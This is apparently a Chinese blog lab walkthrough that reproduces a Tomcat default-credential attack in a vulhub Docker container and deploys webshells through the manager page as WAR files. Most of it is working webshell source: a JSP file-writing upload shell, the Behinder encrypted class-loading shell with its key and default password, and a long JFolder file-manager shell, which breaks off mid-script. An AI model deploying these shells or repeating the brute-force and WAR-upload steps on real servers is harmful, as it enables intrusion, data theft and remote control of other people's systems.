+<p>这边就还是用vulhub进行复现</p>
+<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/tomcat/tomcat8
+
+sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062019.png" alt="1619329013757"></p>
+<p>之前的容器要关掉</p>
+<p>去docker底层看看它的源码</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker ps
+sudo docker exec -ti a bash
+cd conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>把这三个文件复制出来</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xml /home/dayu/Desktop/
+sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/
+sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.xml /home/dayu/Desktop/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062020.png" alt="1619329131808"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062021.png" alt="1619329484692"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062022.png" alt="1619329494731"></p>
+<p>源码</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;tomcat-users xmlns="http://tomcat.apache.org/xml"
+ xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+ xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+ version="1.0"&gt;
+ &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt;
+ &lt;role rolename="manager-jmx"/&gt;
+ &lt;role rolename="manager-status"/&gt;
+ &lt;role rolename="admin-gui"/&gt;
+ &lt;role rolename="admin-script"/&gt;
+ &lt;user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" /&gt;
+ 
+&lt;/tomcat-users&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>manager（后台管理）</p>
+<pre class="line-numbers language-none"><code class="language-none">manager-gui     拥有htmL页面权限
+manager-status  拥有查看 status的权限
+manager-script  拥有text接口的权限，和 status权限
+manager-jmx     拥有jmx权限，和 status权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>host-manager（虚拟主机管理</p>
+<pre class="line-numbers language-none"><code class="language-none">admin-gui    拥有html页面权限
+admin-script 拥有text接口权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>访问一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062023.png" alt="1619329569867"></p>
+<p>访问一下它的后台管理地址</p>
+<pre class="line-numbers language-none"><code class="language-none">/manager/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062024.png" alt="1619329613901"></p>
+<p>或者点这里</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062025.png" alt="1619329717080"></p>
+<p>它的登录窗口是没有验证码的  直接爆破就可以</p>
+<p>默认</p>
+<pre class="line-numbers language-none"><code class="language-none">Users：Tomcat
+
+Passwd：Tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>登录进去之后 进行查看</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062026.png" alt="1619329890433"></p>
+<p><strong>为什么需要上传wa包，为什么不是 tar.zip？？</strong></p>
+<p>war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>
+<p>上传JSP的大马</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%@page contentType="text/html;charset=gb2312"%&gt;    
+&lt;%@page import="java.io.*,java.util.*,java.net.*"%&gt;    
+&lt;html&gt;    
+  &lt;head&gt;    
+    &lt;title&gt;&lt;/title&gt;    
+    &lt;style type="text/css"&gt;    
+     body { color:red; font-size:12px; background-color:white; }    
+    &lt;/style&gt;    
+  &lt;/head&gt;    
+  &lt;body&gt;    
+  &lt;%    
+   if(request.getParameter("context")!=null)    
+   {    
+   String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");    
+   String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");    
+   OutputStream pt = null;    
+        try {    
+            pt = new FileOutputStream(path);    
+            pt.write(context.getBytes());    
+            out.println("&lt;a href='"+request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+request.getRequestURI()+"'&gt;&lt;font color='red' title='点击可以转到上传的文件页面!'&gt;上传成功!&lt;/font&gt;&lt;/a&gt;");    
+        } catch (FileNotFoundException ex2) {    
+            out.println("&lt;font color='red'&gt;上传失败!&lt;/font&gt;");    
+        } catch (IOException ex) {    
+            out.println("&lt;font color='red'&gt;上传失败!&lt;/font&gt;");    
+        } finally {    
+            try {    
+                pt.close();    
+            } catch (IOException ex3) {    
+                out.println("&lt;font color='red'&gt;上传失败!&lt;/font&gt;");    
+            }    
+        }    
+}    
+  %&gt;    
+    &lt;form name="frmUpload" method="post" action=""&gt;    
+    &lt;font color="blue"&gt;本文件的路径:&lt;/font&gt;&lt;%out.print(request.getRealPath(request.getServletPath())); %&gt;    
+    &lt;br&gt;    
+    &lt;br&gt;    
+    &lt;font color="blue"&gt;上传文件路径:&lt;/font&gt;&lt;input type="text" size="70" name="path" value="&lt;%out.print(getServletContext().getRealPath("/")); %&gt;"&gt;    
+    &lt;br&gt;    
+    &lt;br&gt;    
+    上传文件内容:&lt;textarea name="context" id="context" style="width: 51%; height: 150px;"&gt;&lt;/textarea&gt;    
+    &lt;br&gt;    
+    &lt;br&gt;    
+    &lt;input type="submit" name="btnSubmit" value="Upload"&gt;    
+    &lt;/form&gt;    
+  &lt;/body&gt;    
+&lt;/html&gt;   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+<p>zip压缩 然后改后缀 成war的包</p>
+<p>或者使用Java命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">jar -cvf dayu.war dayu.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062027.png" alt="1619339840138"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062028.png" alt="1619339862773"></p>
+<p>这里的<code>/2</code> 就是war包的名字</p>
+<p>去docker底层看看是否成功上传</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062029.png" alt="1619339911577"></p>
+<p> 它会自动部署  那我们访问一下</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062030.png" alt="1619332041600"></p>
+<p>成功解析jsp大马，并能 upload上传功能！</p>
+<p>这里上传冰蝎的jsp马儿</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062031.png" alt="1619340379288"></p>
+<p>upload之后 上冰蝎进行连接</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062032.png" alt="1619340324001"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062033.png" alt="1619340439690"></p>
+<p>在贴一个牛逼的JSP大马</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%
+/**
+JFolder V0.9  windows platform
+@Filename： JFolder.jsp 
+@Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。
+
+@Bugs  :  下载时，中文文件名无法正常显示
+*/
+%&gt;
+&lt;%@ page contentType="text/html;charset=gb2312"%&gt;
+&lt;%@page import="java.io.*,java.util.*,java.net.*" %&gt;
+&lt;%!
+private final static int languageNo=0; //语言版本，0 : 中文； 1：英文
+String strThisFile="JFolder.jsp";
+String[] authorInfo={" &lt;font color=red&gt; 岁月联盟-专用版 &lt;/font&gt;"," &lt;font color=red&gt; Thanks for your support - - by Steven Cee http:// &lt;/font&gt;"};
+String[] strFileManage   = {"文 件 管 理","File Management"};
+String[] strCommand      = {"CMD 命 令","Command Window"};
+String[] strSysProperty  = {"系 统 属 性","System Property"};
+String[] strHelp         = {"帮 助","Help"};
+String[] strParentFolder = {"上级目录","Parent Folder"};
+String[] strCurrentFolder= {"当前目录","Current Folder"};
+String[] strDrivers      = {"驱动器","Drivers"};
+String[] strFileName     = {"文件名称","File Name"};
+String[] strFileSize     = {"文件大小","File Size"};
+String[] strLastModified = {"最后修改","Last Modified"};
+String[] strFileOperation= {"文件操作","Operations"};
+String[] strFileEdit     = {"修改","Edit"};
+String[] strFileDown     = {"下载","Download"};
+String[] strFileCopy     = {"复制","Move"};
+String[] strFileDel      = {"删除","Delete"};
+String[] strExecute      = {"执行","Execute"};
+String[] strBack         = {"返回","Back"};
+String[] strFileSave     = {"保存","Save"};
+
+public class FileHandler
+{
+ private String strAction="";
+ private String strFile="";
+ void FileHandler(String action,String f)
+ {
+ 
+ }
+}
+
+public static class UploadMonitor {
+
+  static Hashtable uploadTable = new Hashtable();
+
+  static void set(String fName, UplInfo info) {
+   uploadTable.put(fName, info);
+  }
+
+  static void remove(String fName) {
+   uploadTable.remove(fName);
+  }
+
+  static UplInfo getInfo(String fName) {
+   UplInfo info = (UplInfo) uploadTable.get(fName);
+   return info;
+  }
+}
+
+public class UplInfo {
+
+  public long totalSize;
+  public long currSize;
+  public long starttime;
+  public boolean aborted;
+
+  public UplInfo() {
+   totalSize = 0l;
+   currSize = 0l;
+   starttime = System.currentTimeMillis();
+   aborted = false;
+  }
+
+  public UplInfo(int size) {
+   totalSize = size;
+   currSize = 0;
+   starttime = System.currentTimeMillis();
+   aborted = false;
+  }
+
+  public String getUprate() {
+   long time = System.currentTimeMillis() - starttime;
+   if (time != 0) {
+    long uprate = currSize * 1000 / time;
+    return convertFileSize(uprate) + "/s";
+   }
+   else return "n/a";
+  }
+
+  public int getPercent() {
+   if (totalSize == 0) return 0;
+   else return (int) (currSize * 100 / totalSize);
+  }
+
+  public String getTimeElapsed() {
+   long time = (System.currentTimeMillis() - starttime) / 1000l;
+   if (time - 60l &gt;= 0){
+    if (time % 60 &gt;=10) return time / 60 + ":" + (time % 60) + "m";
+    else return time / 60 + ":0" + (time % 60) + "m";
+   }
+   else return time&lt;10 ? "0" + time + "s": time + "s";
+  }
+
+  public String getTimeEstimated() {
+   if (currSize == 0) return "n/a";
+   long time = System.currentTimeMillis() - starttime;
+   time = totalSize * time / currSize;
+   time /= 1000l;
+   if (time - 60l &gt;= 0){
+    if (time % 60 &gt;=10) return time / 60 + ":" + (time % 60) + "m";
+    else return time / 60 + ":0" + (time % 60) + "m";
+   }
+   else return time&lt;10 ? "0" + time + "s": time + "s";
+  }
+
+ }
+
+ public class FileInfo {
+
+  public String name = null, clientFileName = null, fileContentType = null;
+  private byte[] fileContents = null;
+  public File file = null;
+  public StringBuffer sb = new StringBuffer(100);
+
+  public void setFileContents(byte[] aByteArray) {
+   fileContents = new byte[aByteArray.length];
+   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);
+  }
+}
+
+// A Class with methods used to process a ServletInputStream
+public class HttpMultiPartParser {
+
+  private final String lineSeparator = System.getProperty("line.separator", "\n");
+  private final int ONE_MB = 1024 * 1;
+
+  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,
+    int clength) throws IllegalArgumentException, IOException {
+   if (is == null) throw new IllegalArgumentException("InputStream");
+   if (boundary == null || boundary.trim().length() &lt; 1) throw new IllegalArgumentException(
+     "\"" + boundary + "\" is an illegal boundary indicator");
+   boundary = "--" + boundary;
+   StringTokenizer stLine = null, stFields = null;
+   FileInfo fileInfo = null;
+   Hashtable dataTable = new Hashtable(5);
+   String line = null, field = null, paramName = null;
+   boolean saveFiles = (saveInDir != null &amp;&amp; saveInDir.trim().length() &gt; 0);
+   boolean isFile = false;
+   if (saveFiles) { // Create the required directory (including parent dirs)
+    File f = new File(saveInDir);
+    f.mkdirs();
+   }
+   line = getLine(is);
+   if (line == null || !line.startsWith(boundary)) throw new IOException(
+     "Boundary not found; boundary = " + boundary + ", line = " + line);
+   while (line != null) {
+    if (line == null || !line.startsWith(boundary)) return dataTable;
+    line = getLine(is);
+    if (line == null) return dataTable;
+    stLine = new StringTokenizer(line, ";\r\n");
+    if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(
+      "Bad data in second line");
+    line = stLine.nextToken().toLowerCase();
+    if (line.indexOf("form-data") &lt; 0) throw new IllegalArgumentException(
+      "Bad data in second line");
+    stFields = new StringTokenizer(stLine.nextToken(), "=\"");
+    if (stFields.countTokens() &lt; 2) throw new IllegalArgumentException(
+      "Bad data in second line");
+    fileInfo = new FileInfo();
+    stFields.nextToken();
+    paramName = stFields.nextToken();
+    isFile = false;
+    if (stLine.hasMoreTokens()) {
+     field = stLine.nextToken();
+     stFields = new StringTokenizer(field, "=\"");
+     if (stFields.countTokens() &gt; 1) {
+      if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {
+       fileInfo.name = paramName;
+       String value = stFields.nextToken();
+       if (value != null &amp;&amp; value.trim().length() &gt; 0) {
+        fileInfo.clientFileName = value;
+        isFile = true;
+       }
+       else {
+        line = getLine(is); // Skip "Content-Type:" line
+        line = getLine(is); // Skip blank line
+        line = getLine(is); // Skip blank line
+        line = getLine(is); // Position to boundary line
+        continue;
+       }
+      }
+     }
+     else if (field.toLowerCase().indexOf("filename") &gt;= 0) {
+      line = getLine(is); // Skip "Content-Type:" line
+      line = getLine(is); // Skip blank line
+      line = getLine(is); // Skip blank line
+      line = getLine(is); // Position to boundary line
+      continue;
+     }
+    }
+    boolean skipBlankLine = true;
+    if (isFile) {
+     line = getLine(is);
+     if (line == null) return dataTable;
+     if (line.trim().length() &lt; 1) skipBlankLine = false;
+     else {
+      stLine = new StringTokenizer(line, ": ");
+      if (stLine.countTokens() &lt; 2) throw new IllegalArgumentException(
+        "Bad data in third line");
+      stLine.nextToken(); // Content-Type
+      fileInfo.fileContentType = stLine.nextToken();
+     }
+    }
+if (skipBlankLine) {
+     line = getLine(is);
+     if (line == null) return dataTable;
+    }
+    if (!isFile) {
+     line = getLine(is);
+     if (line == null) return dataTable;
+     dataTable.put(paramName, line);
+     // If parameter is dir, change saveInDir to dir
+     if (paramName.equals("dir")) saveInDir = line;
+     line = getLine(is);
+     continue;
+    }
+    try {
+     UplInfo uplInfo = new UplInfo(clength);
+     UploadMonitor.set(fileInfo.clientFileName, uplInfo);
+     OutputStream os = null;
+     String path = null;
+     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,
+       fileInfo.clientFileName));
+     else os = new ByteArrayOutputStream(ONE_MB);
+     boolean readingContent = true;
+     byte previousLine[] = new byte[2 * ONE_MB];
+     byte temp[] = null;
+     byte currentLine[] = new byte[2 * ONE_MB];
+     int read, read3;
+     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {
+      line = null;
+      break;
+     }
+     while (readingContent) {
+      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {
+       line = null;
+       uplInfo.aborted = true;
+       break;
+      }
+      if (compareBoundary(boundary, currentLine)) {
+       os.write(previousLine, 0, read - 2);
+       line = new String(currentLine, 0, read3);
+       break;
+      }
+      else {
+       os.write(previousLine, 0, read);
+       uplInfo.currSize += read;
+       temp = currentLine;
+       currentLine = previousLine;
+       previousLine = temp;
+       read = read3;
+      }//end else
+     }//end while
+     os.flush();
+     os.close();
+     if (!saveFiles) {
+      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;
+      fileInfo.setFileContents(baos.toByteArray());
+     }
+     else fileInfo.file = new File(path);
+     dataTable.put(paramName, fileInfo);
+     uplInfo.currSize = uplInfo.totalSize;
+    }//end try
+    catch (IOException e) {
+     throw e;
+    }
+   }
+   return dataTable;
+  }
+
+  /**
+   * Compares boundary string to byte array
+   */
+  private boolean compareBoundary(String boundary, byte ba[]) {
+   byte b;
+   if (boundary == null || ba == null) return false;
+   for (int i = 0; i &lt; boundary.length(); i++)
+    if ((byte) boundary.charAt(i) != ba[i]) return false;
+   return true;
+  }
+
+  /** Convenience method to read HTTP header lines */
+  private synchronized String getLine(ServletInputStream sis) throws IOException {
+   byte b[] = new byte[1024];
+   int read = sis.readLine(b, 0, b.length), index;
+   String line = null;
+   if (read != -1) {
+    line = new String(b, 0, read);
+    if ((index = line.indexOf('\n')) &gt;= 0) line = line.substring(0, index - 1);
+   }
+   return line;
+  }
+
+  public String getFileName(String dir, String fileName) throws IllegalArgumentException {
+   String path = null;
+   if (dir == null || fileName == null) throw new IllegalArgumentException(
+     "dir or fileName is null");
+   int index = fileName.lastIndexOf('/');
+   String name = null;
+   if (index &gt;= 0) name = fileName.substring(index + 1);
+   else name = fileName;
+   index = name.lastIndexOf('\\');
+   if (index &gt;= 0) fileName = name.substring(index + 1);
+   path = dir + File.separator + fileName;
+   if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);
+   else return path.replace('/', File.separatorChar);
+  }
+} //End of class HttpMultiPartParser
+
+String formatPath(String p)
+{
+ StringBuffer sb=new StringBuffer();
+ for (int i = 0; i &lt; p.length(); i++) 
+ {
+  if(p.charAt(i)=='\\')
+  {
+   sb.append("\\\\");
+  }
+  else
+  {
+   sb.append(p.charAt(i));
+  }
+ }
+ return sb.toString();
+}
+
+ /**
+  * Converts some important chars (int) to the corresponding html string
+  */
+ static String conv2Html(int i) {
+  if (i == '&amp;') return "&amp;";
+  else if (i == '&lt;') return "&lt;";
+  else if (i == '&gt;') return "&gt;";
+  else if (i == '"') return """;
+  else return "" + (char) i;
+ }
+
+ /**
+  * Converts a normal string to a html conform string
+  */
+ static String htmlEncode(String st) {
+  StringBuffer buf = new StringBuffer();
+  for (int i = 0; i &lt; st.length(); i++) {
+   buf.append(conv2Html(st.charAt(i)));
+  }
+  return buf.toString();
+ }
+String getDrivers()
+/**
+Windows系统上取得可用的所有逻辑盘
+*/
+{
+ StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : ");
+ File roots[]=File.listRoots();
+ for(int i=0;i&lt;roots.length;i++)
+ {
+  sb.append(" &lt;a href=\"javascript:doForm('','"+roots[i]+"\\','','','1','');\"&gt;");
+  sb.append(roots[i]+"&lt;/a&gt;&amp;nbsp;");
+ }
+ return sb.toString();
+}
+static String convertFileSize(long filesize)
+{
+ //bug 5.09M 显示5.9M
+ String strUnit="Bytes";
+ String strAfterComma="";
+ int intDivisor=1;
+ if(filesize&gt;=1024*1024)
+ {
+  strUnit = "MB";
+  intDivisor=1024*1024;
+ }
+ else if(filesize&gt;=1024)
+ {
+  strUnit = "KB";
+  intDivisor=1024;
+ }
+ if(intDivisor==1) return filesize + " " + strUnit;
+ strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ;
+ if(strAfterComma=="") strAfterComma=".0";
+ return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
+}
+%&gt;
+&lt;%
+request.setCharacterEncoding("gb2312");
+String tabID = request.getParameter("tabID");
+String strDir = request.getParameter("path");
+String strAction = request.getParameter("action");
+String strFile = request.getParameter("file");
+String strPath = strDir + "\\" + strFile; 
+String strCmd = request.getParameter("cmd");
+StringBuffer sbEdit=new StringBuffer("");
+StringBuffer sbDown=new StringBuffer("");
+StringBuffer sbCopy=new StringBuffer("");
+StringBuffer sbSaveCopy=new StringBuffer("");
+StringBuffer sbNewFile=new StringBuffer("");
+
+if((tabID==null) || tabID.equals(""))
+{
+ tabID = "1";
+}
+
+if(strDir==null||strDir.length()&lt;1)
+{
+ strDir = request.getRealPath("/");
+}
+
+
+if(strAction!=null &amp;&amp; strAction.equals("down"))
+{
+ File f=new File(strPath);
+ if(f.length()==0)
+ {
+  sbDown.append("文件大小为 0 字节，就不用下了吧");
+ }
+ else
+ {
+  response.setHeader("content-type","text/html; charset=ISO-8859-1");
+  response.setContentType("APPLICATION/OCTET-STREAM"); 
+  response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");
+  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());
+  out.clearBuffer();
+  int i;
+  while ((i=fileInputStream.read()) != -1)
+  {
+   out.write(i); 
+  }
+  fileInputStream.close();
+  out.close();
+ }
+}
+
+if(strAction!=null &amp;&amp; strAction.equals("del"))
+{
+ File f=new File(strPath);
+ f.delete();
+}
+
+if(strAction!=null &amp;&amp; strAction.equals("edit"))
+{
+ File f=new File(strPath); 
+ BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));
+ sbEdit.append("&lt;form name='frmEdit' action='' method='POST'&gt;\r\n");
+ sbEdit.append("&lt;input type=hidden name=action value=save &gt;\r\n");
+ sbEdit.append("&lt;input type=hidden name=path value='"+strDir+"' &gt;\r\n");
+ sbEdit.append("&lt;input type=hidden name=file value='"+strFile+"' &gt;\r\n");
+ sbEdit.append("&lt;input type=submit name=save value=' "+strFileSave[languageNo]+" '&gt; ");
+ sbEdit.append("&lt;input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'&gt; &amp;nbsp;"+strPath+"\r\n");
+ sbEdit.append("&lt;br&gt;&lt;textarea rows=30 cols=90 name=content&gt;");
+ String line="";
+ while((line=br.readLine())!=null)
+ {
+  sbEdit.append(htmlEncode(line)+"\r\n");  
+ }
+   sbEdit.append("&lt;/textarea&gt;");
+ sbEdit.append("&lt;input type=hidden name=path value="+strDir+"&gt;");
+ sbEdit.append("&lt;/form&gt;");
+}
+
+if(strAction!=null &amp;&amp; strAction.equals("save"))
+{
+ File f=new File(strPath);
+ BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));
+ String strContent=request.getParameter("content");
+ bw.write(strContent);
+ bw.close();
+}
+if(strAction!=null &amp;&amp; strAction.equals("copy"))
+{
+ File f=new File(strPath);
+ sbCopy.append("&lt;br&gt;&lt;form name='frmCopy' action='' method='POST'&gt;\r\n");
+ sbCopy.append("&lt;input type=hidden name=action value=savecopy &gt;\r\n");
+ sbCopy.append("&lt;input type=hidden name=path value='"+strDir+"' &gt;\r\n");
+ sbCopy.append("&lt;input type=hidden name=file value='"+strFile+"' &gt;\r\n");
+ sbCopy.append("原始文件： "+strPath+"&lt;p&gt;");
+ sbCopy.append("目标文件： &lt;input type=text name=file2 size=40 value='"+strDir+"'&gt;&lt;p&gt;");
+ sbCopy.append("&lt;input type=submit name=save value=' "+strFileCopy[languageNo]+" '&gt; ");
+ sbCopy.append("&lt;input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'&gt; &lt;p&gt;&amp;nbsp;\r\n");
+ sbCopy.append("&lt;/form&gt;");
+}
+if(strAction!=null &amp;&amp; strAction.equals("savecopy"))
+{
+ File f=new File(strPath);
+ String strDesFile=request.getParameter("file2");
+ if(strDesFile==null || strDesFile.equals(""))
+ {
+  sbSaveCopy.append("&lt;p&gt;&lt;font color=red&gt;目标文件错误。&lt;/font&gt;");
+ }
+ else
+ {
+  File f_des=new File(strDesFile);
+  if(f_des.isFile())
+  {
+   sbSaveCopy.append("&lt;p&gt;&lt;font color=red&gt;目标文件已存在,不能复制。&lt;/font&gt;");
+  }
+  else
+  {
+   String strTmpFile=strDesFile;
+   if(f_des.isDirectory())
+   {
+    if(!strDesFile.endsWith("\\"))
+    {
+     strDesFile=strDesFile+"\\";
+    }
+    strTmpFile=strDesFile+"cqq_"+strFile;
+    }
+   
+   File f_des_copy=new File(strTmpFile);
+   FileInputStream in1=new FileInputStream(f);
+   FileOutputStream out1=new FileOutputStream(f_des_copy);
+   byte[] buffer=new byte[1024];
+   int c;
+   while((c=in1.read(buffer))!=-1)
+   {
+    out1.write(buffer,0,c);
+   }
+   in1.close();
+   out1.close();
+ 
+   sbSaveCopy.append("原始文件 ："+strPath+"&lt;p&gt;");
+   sbSaveCopy.append("目标文件 ："+strTmpFile+"&lt;p&gt;");
+   sbSaveCopy.append("&lt;font color=red&gt;复制成功！&lt;/font&gt;");   
+  }  
+ } 
+ sbSaveCopy.append("&lt;p&gt;&lt;input type=button name=saveCopyBack onclick='history.back(-2);' value=返回&gt;");
+}
+if(strAction!=null &amp;&amp; strAction.equals("newFile"))
+{
+ String strF=request.getParameter("fileName");
+ String strType1=request.getParameter("btnNewFile");
+ String strType2=request.getParameter("btnNewDir");
+ String strType="";
+ if(strType1==null)
+ {
+  strType="Dir";
+ }
+ else if(strType2==null)
+ {
+  strType="File";
+ }
+ if(!strType.equals("") &amp;&amp; !(strF==null || strF.equals("")))
+ {  
+   File f_new=new File(strF);   
+   if(strType.equals("File") &amp;&amp; !f_new.createNewFile())
+    sbNewFile.append(strF+" 文件创建失败");
+   if(strType.equals("Dir") &amp;&amp; !f_new.mkdirs())
+    sbNewFile.append(strF+" 目录创建失败");
+ }
+ else
+ {
+  sbNewFile.append("&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;");
+ }
+}
+
+if((request.getContentType()!= null) &amp;&amp; (request.getContentType().toLowerCase().startsWith("multipart")))
+{
+ String tempdir=".";
+ boolean error=false;
+ response.setContentType("text/html");
+ sbNewFile.append("&lt;p&gt;&lt;font color=red&gt;建立文件或目录出错。&lt;/font&gt;");
+ HttpMultiPartParser parser = new HttpMultiPartParser();
+
+ int bstart = request.getContentType().lastIndexOf("oundary=");
+ String bound = request.getContentType().substring(bstart + 8);
+ int clength = request.getContentLength();
+ Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);
+ if (ht.get("cqqUploadFile") != null)
+ {
+
+  FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
+  File f1 = fi.file;
+  UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
+  if (info != null &amp;&amp; info.aborted) 
+  {
+   f1.delete();
+   request.setAttribute("error", "Upload aborted");
+  }
+  else 
+  {
+   String path = (String) ht.get("path");
+   if(path!=null &amp;&amp; !path.endsWith("\\")) 
+    path = path + "\\";
+   if (!f1.renameTo(new File(path + f1.getName()))) 
+   {
+    request.setAttribute("error", "Cannot upload file.");
+    error = true;
+    f1.delete();
+   }
+  }
+ }
+}
+%&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style type="text/css"&gt;
+td,select,input,body{font-size:9pt;}
+A { TEXT-DECORATION: none }
+
+#tablist{
+padding: 5px 0;
+margin-left: 0;
+margin-bottom: 0;
+margin-top: 0.1em;
+font:9pt;
+}
+
+#tablist li{
+list-style: none;
+display: inline;
+margin: 0;
+}
+
+#tablist li a{
+padding: 3px 0.5em;
+margin-left: 3px;
+border: 1px solid ;
+background: F6F6F6;
+}
+
+#tablist li a:link, #tablist li a:visited{
+color: navy;
+}
+
+#tablist li a.current{
+background: #EAEAFF;
+}
+
+#tabcontentcontainer{
+width: 100%;
+padding: 5px;
+border: 1px solid black;
+}
+
+.tabcontent{
+display:none;
+}
+
+&lt;/style&gt;
+
+&lt;script type="text/javascript"&gt;
+
+var initialtab=[&lt;%=tabID%&gt;, "menu&lt;%=tabID%&gt;"]
+
+////////Stop editting////////////////
+
+function cascadedstyle(el, cssproperty, csspropertyNS){
+if (el.currentStyle)
+return el.currentStyle[cssproperty]
+else if (window.getComputedStyle){
+var elstyle=window.getComputedStyle(el, "")
+return elstyle.getPropertyValue(csspropertyNS)
+}
+}
+
+var previoustab=""
+
+function expandcontent(cid, aobject){
+if (document.getElementById){
+highlighttab(aobject)
+if (previoustab!="")
+document.getElementById(previoustab).style.display="none"
+document.getElementById(cid).style.display="block"
+previoustab=cid
+if (aobject.blur)
+aobject.blur()
+return false
+}
+else
+return true
+}
+
+function highlighttab(aobject){
+if (typeof tabobjlinks=="undefined")
+collecttablinks()
+for (i=0; i&lt;tabobjlinks.length; i++)
+tabobjlinks[i].style.backgroundColor=initTabcolor
